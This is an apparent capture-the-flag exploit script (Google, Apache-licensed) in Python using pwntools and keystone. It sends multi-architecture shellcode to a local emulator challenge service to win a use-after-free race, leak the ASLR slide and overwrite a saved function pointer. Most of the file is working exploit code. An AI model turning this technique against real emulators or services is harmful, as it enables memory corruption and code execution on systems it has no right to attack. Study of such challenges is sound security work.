# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
from keystone import *
# Process A (mips)
# create shared buffer 0
# pause
# switch arches (reallocate freed buffer as unicorn engine) (arm)
# pause
# bookmark (trigger corrupted function pointer stored in unicorn engine)
# ROP to glory

# Process B (arm64)
# bookmark
# pause (or exit 2nd time through?)
# map shared buffer 0
# pause
# rewind

# Process C (x84-64)
# resume B
# resume B
# map shared buffer 0 (racing B to map while freeing the underlying buffer)
# if map is 0'd out
#  then fail out (we missed the race)
# resume A (reallocate freed buffer as unicorn engine)
# fetch aslr slide from underlying buffer via saved function pointers
# modify saved function pointers
# resume A

x86_ks = Ks(KS_ARCH_X86, KS_MODE_64)
mips_ks = Ks(KS_ARCH_MIPS,KS_MODE_MIPS64)
arm_ks = Ks(KS_ARCH_ARM,KS_MODE_ARM)
arm64_ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
processAcode = \
    'li $a0,3; ' \
    'li $a1,0x4000;' \
    'syscall;' \
    'li $a0,9;' \
    'syscall;' \
    'li $a0,8;' \
    'li $a1,1;' \
    'li $a2,0;' \
    'li $a3,0x103c;' \
    'syscall;' \
    'addi $a1,$a0,0;' \
    'li $a0,2;' \
    'syscall;' \
    'li $a0,0;' \
    'syscall;'
processAcodeARM = \
    'mov r0, #9;' \
    'svc #0;' \
    'mov r0, #9;' \
    'svc #0;' \
    'mov r0, #6;' \
    'svc #0;'
processBcode = \
    'mov x0,#6;' \
    'svc #0;' \
    'mov x0,#9;' \
    'svc #0;' \
    'mov x0,#4;' \
    'mov x1,#0x4000;' \
    'mov x2,#0x1000;' \
    'mov x3,#0;' \
    'svc #0;' \
    'mov x0,#9;' \
    'svc #0;' \
    'mov x0,#7;' \
    'svc #0;'
processCcode = \
    'pause0: mov rax,10;' \
    'mov rbx,1;' \
    'int 0x80;' \
    'cmp rax,0xffffffffffffffff;' \
    'je pause0;' \
    'pause1: mov rax,10;' \
    'mov rbx,1;' \
    'int 0x80;' \
    'cmp rax,0xffffffffffffffff;' \
    'je pause1;' \
    'mov rax,4;' \
    'mov rbx,0x4000;' \
    'mov rcx,0x4000;' \
    'mov rdx,0;' \
    'int 0x80;' \
    'mov rdi,0x4000;' \
    'mov rbx,[rdi];' \
    'cmp rbx,0;' \
    'jne reclaim;' \
    'mov rax,0;' \
    'int 0x80;' \
    'reclaim: mov rax,10;' \
    'mov rbx,0;' \
    'int 0x80;' \
    'pause2: mov rax,10;' \
    'mov rbx,0;' \
    'int 0x80;' \
    'cmp rax,0xffffffffffffffff;' \
    'je pause2;' \
    'mov rbx,[rdi + 0x1a0];' \
    'mov rax,2;' \
    'int 0x80;' \
    'mov rbx,0x701d10;' \
    'mov qword ptr [rdi + 0x1a0],0x41414141;' \
    'pause3: mov rax,10;' \
    'mov rbx,0;' \
    'int 0x80;' \
    'cmp rax,0xffffffffffffffff;' \
    'je pause3;'
# processAcode = \
#     'li $a2,12;' \
#     'li $a0,0;' \
#     'li $a1,4120;' \
#     'syscall;' \
#     'li $a0,1;' \
#     'syscall;' \
#     'hello: '
processAsc = bytes(mips_ks.asm(processAcode,0x1000)[0])
processAsc += bytes(arm_ks.asm(processAcodeARM,0x1030)[0])
processBsc = bytes(arm64_ks.asm(processBcode,0x1000)[0])
processCsc = bytes(x86_ks.asm(processCcode,0x1000)[0])
print(processAsc)
print(processBsc)
print(processCsc)
# print(processAsc)
# processAsc += b"hello world\n"
# exit(0)
def send_program(r,arch,mode,maps,sc):
    header = struct.pack("IILLLLLLLLHBxxxxx",arch,mode,
                         maps[0][0],
                         maps[0][1],
                         maps[1][0] if len(maps) > 1 else 0,
                         maps[1][1] if len(maps) > 1 else 0,
                         maps[2][0] if len(maps) > 2 else 0,
                         maps[2][1] if len(maps) > 2 else 0,
                         maps[3][0] if len(maps) > 3 else 0,
                         maps[3][1] if len(maps) > 3 else 0,
                         len(sc),
                         len(maps))
    r.send(header)
    r.recv()
    r.send(sc)
    print(r.recv())
    return
                
port = 34901
def attempt():
    r = remote('localhost',port)
    print(r.recv())
    print(r.recv())

    #sc = bytes(x86_ks.asm('mov eax,0; lea ebx,[rip + hello]; mov ecx, 12; int 0x80; hello:')[0])
    #pause()
    #sc = asm('mov eax,0; lea ebx,[rip + hello]; mov ecx, 12; int 0x80; hello:',arch="amd64")
    #sc += b"Hello world\n"
    #sc = asm('',arch="mips")
    # send_program(4,1 << 3,[(0x1000,0x1000)],prosc) #x86
    send_program(r,3,1 << 3,[(0x1000,0x1000)],processAsc)
    send_program(r,2,0,[(0x1000,0x1000)],processBsc)
    #pause()
    send_program(r,4,1 << 3,[(0x1000,0x1000)],processCsc) #x86
    output = r.recv().splitlines()
    if len(output) == 1:
        return
    print(output)
    num = int(output[output[0][0] == ord('P')]) & 0xFFF
    if num == 3344:
        exit(0)


attempt()
